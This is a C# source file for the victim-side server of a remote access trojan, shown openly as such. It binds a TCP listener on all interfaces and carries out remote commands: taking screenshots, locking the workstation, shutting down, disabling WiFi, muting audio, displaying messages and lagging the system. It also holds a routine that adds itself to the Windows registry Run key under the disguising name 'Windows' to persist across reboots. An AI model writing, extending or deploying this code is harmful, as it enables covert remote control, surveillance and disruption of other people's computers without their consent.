using Microsoft.Win32;
using RAT_Library;
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace RAT_Victim
{
    internal static class Program
    {
        public static Socket Client;

        private static void Main()
        {
            //AddToStartup();
            StartServer();
        }

        private static void StartServer()
        {
            Console.WriteLine("Starting server");

            var server = new Socket(SocketType.Stream, ProtocolType.Tcp);
            server.Bind(new IPEndPoint(IPAddress.Any, Common.Port));
            server.Listen(0);

            while (true)
            {
                Client = server.Accept();
                var buffer = new byte[Common.BufferSize];
                var byteCount = Client.Receive(buffer);
                var command = (RatCommand)buffer[0];

                switch (command)
                {
                    case RatCommand.CloseActiveWindow:
                        Commands.CloseActiveWindow();
                        break;
                    case RatCommand.ShowMessageBox:
                        Commands.ShowMessageBox();
                        break;
                    case RatCommand.TakeScreenshot:
                        Commands.TakeScreenshot();
                        break;
                    case RatCommand.Lock:
                        WinApi.LockWorkStation();
                        break;
                    case RatCommand.Shutdown:
                        Commands.Shutdown();
                        break;
                    case RatCommand.SendMessage:
                        Commands.SendMessage(Common.MessageEncoding.GetString(buffer, 1, byteCount));
                        break;
                    case RatCommand.PlaySound:
                        Commands.PlaySound(new MemoryStream(buffer, 1, byteCount));
                        break;
                    case RatCommand.Mute:
                        WinApi.keybd_event(Keys.VolumeMute, 0, 0, 0);
                        break;
                    case RatCommand.DisableWiFi:
                        Commands.DisableWiFi();
                        break;
                    case RatCommand.Lag:
                        Commands.Lag();
                        break;
                    default:
                        throw new ArgumentOutOfRangeException();
                }
            }
        }

        private static void AddToStartup()
        {
            Console.WriteLine("Adding to startup");

            var subKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            const string appName = "Windows";
            if (subKey.GetValue(appName) == null)
                subKey.SetValue(appName, Application.ExecutablePath);
        }
    }
}
